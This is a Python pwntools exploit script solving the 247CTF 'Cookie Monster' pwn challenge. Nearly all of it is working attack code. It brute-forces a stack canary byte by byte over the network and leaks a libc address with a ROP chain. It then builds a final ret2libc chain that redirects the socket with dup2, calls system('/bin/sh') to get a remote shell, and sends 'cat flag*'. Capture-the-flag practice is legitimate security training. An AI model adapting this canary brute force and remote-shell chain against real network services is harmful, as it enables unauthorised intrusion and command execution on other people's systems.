#!/usr/bin/env python3
"""
Cookie Monster - 247CTF PWN Challenge
Stack canary brute force + ROP chain exploit
"""
from pwn import *
import time

HOST = "0b1e1d5f8b809485.247ctf.com"
PORT = 50428

CANARY_OFFSET = 512
KNOWN_CANARY = p32(0xafcc5b00)

# Binary addresses
send_plt = 0x080485c0
exit_plt = 0x08048520
libc_start_main_got = 0x0804a028
pop4_ret = 0x08048a68
pop3_ret = 0x08048a69

# libc6-i386_2.27-3ubuntu1_amd64 offsets
LIBC_START_MAIN_OFF = 0x18d90
SYSTEM_OFF = 0x3cd10
BINSH_OFF = 0x17b8cf
DUP2_OFF = 0xe6110

def leak_got(canary, socket_fd, got_addr):
    r = remote(HOST, PORT, timeout=10, level='error')
    r.recv(timeout=2)
    rop = p32(send_plt) + p32(pop4_ret) + p32(socket_fd) + p32(got_addr) + p32(4) + p32(0) + p32(exit_plt)
    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)
    time.sleep(1)
    data = r.recv(timeout=3)
    r.close()
    if b"Incorrect" in data:
        idx = data.find(b"Incorrect secret password:\n")
        leaks = data[idx + len(b"Incorrect secret password:\n"):]
        return u32(leaks[:4])
    return u32(data[:4])

def bruteforce_canary():
    """Brute force the stack canary byte by byte."""
    canary = b""
    for i in range(4):
        for byte in range(256):
            try:
                r = remote(HOST, PORT, timeout=5, level='error')
                r.recv(timeout=2)
                payload = b"A" * CANARY_OFFSET + canary + bytes([byte])
                r.send(payload)
                data = r.recv(timeout=2)
                r.close()
                if b"Come back" in data:
                    canary += bytes([byte])
                    print(f"[+] Canary byte {i}: 0x{byte:02x}")
                    break
            except:
                continue
        else:
            print(f"[-] Failed to find canary byte {i}")
            return None
    return canary

def exploit():
    context.arch = 'i386'
    canary = KNOWN_CANARY
    socket_fd = 4

    print(f"[+] Using known canary: {hex(u32(canary))}")

    # Leak libc
    print("[*] Leaking __libc_start_main...")
    libc_start_addr = leak_got(canary, socket_fd, libc_start_main_got)
    print(f"[+] __libc_start_main@libc: {hex(libc_start_addr)}")

    # Calculate addresses
    libc_base = libc_start_addr - LIBC_START_MAIN_OFF
    system = libc_base + SYSTEM_OFF
    binsh = libc_base + BINSH_OFF
    dup2 = libc_base + DUP2_OFF

    print(f"[+] libc_base = {hex(libc_base)}")
    print(f"[+] system = {hex(system)}")
    print(f"[+] dup2 = {hex(dup2)}")
    print(f"[+] /bin/sh = {hex(binsh)}")

    # Final exploit
    print("[*] === Sending final payload ===")
    r = remote(HOST, PORT)
    r.recv(timeout=2)

    rop = b""
    # dup2(socket_fd, 0) - redirect stdin
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(0) + p32(0)
    # dup2(socket_fd, 1) - redirect stdout
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(1) + p32(0)
    # system("/bin/sh")
    rop += p32(system) + p32(exit_plt) + p32(binsh)

    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(1)
    print("[*] Sending commands...")
    r.sendline(b"cat flag*")
    print(f"[+] Response: {r.recv()}")

if __name__ == "__main__":
    exploit()
